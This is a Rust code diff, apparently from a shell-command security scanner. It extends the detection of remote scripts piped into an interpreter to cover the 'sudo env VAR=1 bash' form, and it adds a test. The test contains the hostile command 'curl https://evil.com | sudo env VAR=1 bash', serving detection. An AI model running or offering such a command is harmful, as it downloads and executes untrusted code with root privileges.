@@ -49,7 +49,7 @@ fn resolve_interpreter_name(seg: &tokenize::Segment) -> Option<String> {
             // Flags that take a separate value argument
             let sudo_value_flags = ["-u", "-g", "-C", "-D", "-R", "-T"];
             let mut skip_next = false;
-            for arg in &seg.args {
+            for (idx, arg) in seg.args.iter().enumerate() {
                 if skip_next {
                     skip_next = false;
                     continue;
@@ -70,37 +70,51 @@ fn resolve_interpreter_name(seg: &tokenize::Segment) -> Option<String> {
                     continue;
                 }
                 let base = trimmed.rsplit('/').next().unwrap_or(trimmed).to_lowercase();
+                if base == "env" {
+                    return resolve_env_from_args(&seg.args[idx + 1..]);
+                }
                 if is_interpreter(&base) {
                     return Some(base);
                 }
                 break;
             }
         } else if cmd_base == "env" {
-            let env_value_flags = ["-u"];
-            let mut skip_next = false;
-            for arg in &seg.args {
-                if skip_next {
-                    skip_next = false;
-                    continue;
-                }
-                let trimmed = arg.trim();
-                if trimmed.starts_with('-') {
-                    if env_value_flags.contains(&trimmed) {
-                        skip_next = true;
-                    }
-                    continue;
-                }
-                // VAR=val assignments
-                if trimmed.contains('=') {
-                    continue;
-                }
-                let base = trimmed.rsplit('/').next().unwrap_or(trimmed).to_lowercase();
-                if is_interpreter(&base) {
-                    return Some(base);
-                }
-                break;
-            }
+            return resolve_env_from_args(&seg.args);
         }
+    }
+    None
+}
+
+fn resolve_env_from_args(args: &[String]) -> Option<String> {
+    let env_value_flags = ["-u"];
+    let mut skip_next = false;
+    for arg in args {
+        if skip_next {
+            skip_next = false;
+            continue;
+        }
+        let trimmed = arg.trim();
+        if trimmed.starts_with("--") {
+            if !trimmed.contains('=') {
+                skip_next = true;
+            }
+            continue;
+        }
+        if trimmed.starts_with('-') {
+            if env_value_flags.contains(&trimmed) {
+                skip_next = true;
+            }
+            continue;
+        }
+        // VAR=val assignments
+        if trimmed.contains('=') {
+            continue;
+        }
+        let base = trimmed.rsplit('/').next().unwrap_or(trimmed).to_lowercase();
+        if is_interpreter(&base) {
+            return Some(base);
+        }
+        break;
     }
     None
 }
@@ -333,6 +347,20 @@ mod tests {
                 .iter()
                 .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
             "should detect pipe through env -S bash -x"
+        );
+    }
+
+    #[test]
+    fn test_pipe_sudo_env_detected() {
+        let findings = check(
+            "curl https://evil.com | sudo env VAR=1 bash",
+            ShellType::Posix,
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
+            "should detect pipe through sudo env VAR=1 bash"
         );
     }
 }
